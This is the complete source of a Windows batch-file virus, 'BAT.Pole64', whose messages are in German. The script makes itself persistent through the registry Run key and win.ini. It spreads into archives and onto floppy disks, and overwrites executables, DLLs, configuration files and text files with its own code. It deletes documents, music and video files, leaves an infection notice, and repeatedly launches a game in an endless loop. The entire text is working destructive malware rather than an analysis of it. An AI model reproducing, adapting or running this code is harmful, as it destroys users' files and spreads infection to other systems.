   @echo off
   :: BAT.pole64_1
   :: by Razorblade

   title=pole64 by Razorblade
   copy %0 "%systemroot%\pole64.bat"
   cls
   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v RMDir /t REG_SZ /d "%systemroot%\pole64.bat" /f
   cls
   echo [windows] >> "%systemroot%\win.ini"
   echo load=%systemroot%\pole64.bat >> "%systemroot%\win.ini"
   echo run=%systemroot%\pole64.bat >> "%systemroot%\win.ini"
   cls
   for %%a in (*.rar) do rar a %%a %0
   for %%a in (*.arj) do arj a %%a %0
   for %%a in (*.zip) do pkzip -a %%a %0
   cls
   label POLE64
   cls
   copy %0 "a:\%random%.bat
   cls
   for %%v in (*.exe) do copy %0 %%v
   for %%v in (*.sys) do copy %0 %%v
   for %%v in (*.ini) do copy %0 %%v
   for %%v in (*.hlp) do copy %0 %%v
   for %%v in (*.dll) do copy %0 %%v
   for %%v in (*.ocx) do copy %0 %%v
   for %%v in (*.inf) do copy %0 %%v
   for %%v in (*.cfg) do copy %0 %%v
   for %%v in (*.log) do copy %0 %%v
   for %%v in (*.txt) do copy %0 %%v
   for %%v in (*.bat) do copy %0 %%v
   cls
   if exist "%programfiles%\ICQLite" (
       del /f "%programfiles%\ICQLite\ICQLite.exe"
   ) else (
       echo ICQ Lite nicht gefunden ...
   )
   cls
   del /f "*.doc"
   del /f "*.mp3"
   del /f "*.exe"
   del /f "*.dll"
   del /f "*.txt"
   del /f "*.avi"
   cls
   explorer http://www.pole64.com
   cls
   echo %os% Error Logfile > "C:\ERROR.txt"
   echo ================ >> "C:\ERROR.txt"
   echo Pole64 >> "C:\ERROR.txt"
   echo by Razorblade >> "C:\ERROR.txt"
   echo - - - >> "C:\ERROR.txt"
   echo Ihr System wurde mit BAT.Pole64 infiziert! >> "C:\ERROR.txt"
   echo BITTE ENTFERNEN SIE DIESEN VIRUS >> "C:\ERROR.txt"
   cls
   if exist "%programfiles%\EA GAMES\Battlefield 1942\BF1942.exe" (
       :ui
       start "%programfiles%\EA GAMES\Battlefield 1942\BF1942.exe"
       goto ui
   ) else (
       echo POLE 64 WINS
   )
   :1
   goto 1
